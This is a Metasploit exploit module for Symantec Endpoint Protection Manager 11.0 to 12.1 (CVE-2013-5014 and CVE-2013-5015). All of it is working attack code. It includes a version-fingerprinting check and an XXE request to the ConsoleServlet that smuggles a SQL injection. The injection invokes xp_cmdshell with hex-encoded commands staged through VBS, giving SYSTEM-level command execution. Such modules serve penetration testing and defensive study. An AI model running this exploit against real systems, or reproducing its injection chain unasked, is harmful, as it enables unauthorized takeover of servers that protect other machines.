##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/powershell'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include REXML
  include Msf::Exploit::CmdStagerVBS
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Symantec Endpoint Protection Manager Remote Command Execution',
      'Description'    => %q{
        This module exploits XXE and SQL injection flaws in Symantec Endpoint Protection Manager
        versions 11.0, 12.0 and 12.1. When supplying a specially crafted XXE request an attacker
        can reach SQL injection affected components. As xp_cmdshell is enabled in the included
        database instance, it's possible to execute arbitrary system commands on the remote system
        with SYSTEM privileges.
      },
      'Author'         =>
        [
          'Stefan Viehbock', # Discovery
          'Chris Graham', # PoC exploit
          'xistence <xistence[at]0x90.nl>' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-5014' ],
          [ 'CVE', '2013-5015' ],
          [ 'EDB', '31853'],
          [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140218-0_Symantec_Endpoint_Protection_Multiple_critical_vulnerabilities_wo_poc_v10.txt' ]
        ],
      'Arch'           => ARCH_X86,
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows VBS Stager', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Feb 24 2014',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(9090),
        OptString.new('TARGETURI', [true, 'The base path', '/'])
      ], self.class)
  end

  def check
    res = send_request_cgi(
      {
        'uri'   =>  normalize_uri(target_uri.path),
        'method' => 'GET',
      })

    if res && res.code == 200 && res.body =~ /Symantec Endpoint Protection Manager/ && res.body =~ /1995 - 2013 Symantec Corporation/
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Sending payload")
    # Execute the cmdstager, max length of the commands is ~3950
    execute_cmdstager({:linemax => 3950})
  end

  def execute_command(cmd, opts = {})
    # Convert the command data to hex, so we can use that in the xp_cmdshell. Else characters like '>' will be harder to bypass in the XML.
    command = "0x#{Rex::Text.to_hex("cmd /c #{cmd}", '')}"

    # Generate random 'xx032xxxx' sequence number.
    seqnum = "#{rand_text_numeric(2)}032#{rand_text_numeric(4)}"

    soap = soap_request(seqnum, command)

    post_data = Rex::MIME::Message.new
    post_data.add_part(soap, "text/xml", nil, "form-data; name=\"Content\"")
    xxe = post_data.to_s

    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, 'servlet', 'ConsoleServlet'),
        'method' => 'POST',
        'vars_get' => { 'ActionType' => 'ConsoleLog' },
        'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
        'data' => xxe,
      })

    if res and res.body !~ /ResponseCode/
      fail_with(Failure::Unknown, "#{peer} - Something went wrong.")
    end
  end

  def soap_request(seqnum, command)
    randpayload = rand_text_alpha(8+rand(8))
    randxxe = rand_text_alpha(8+rand(8))
    entity = "<!ENTITY #{randpayload} SYSTEM \"http://127.0.0.1:9090/servlet/ConsoleServlet?"
    entity << "ActionType=ConfigServer&action=test_av&SequenceNum=#{seqnum}&Parameter=';call xp_cmdshell(#{command});--\" >"

    xml = Document.new
    xml.add(DocType.new('sepm', "[ METASPLOIT ]"))
    xml.add_element("Request")
    xxe = xml.root.add_element(randxxe)
    xxe.text = "PAYLOAD"

    xml_s = xml.to_s
    xml_s.gsub!(/METASPLOIT/, entity) # To avoid html encoding
    xml_s.gsub!(/PAYLOAD/, "&#{randpayload};") # To avoid html encoding

    xml_s
  end

end
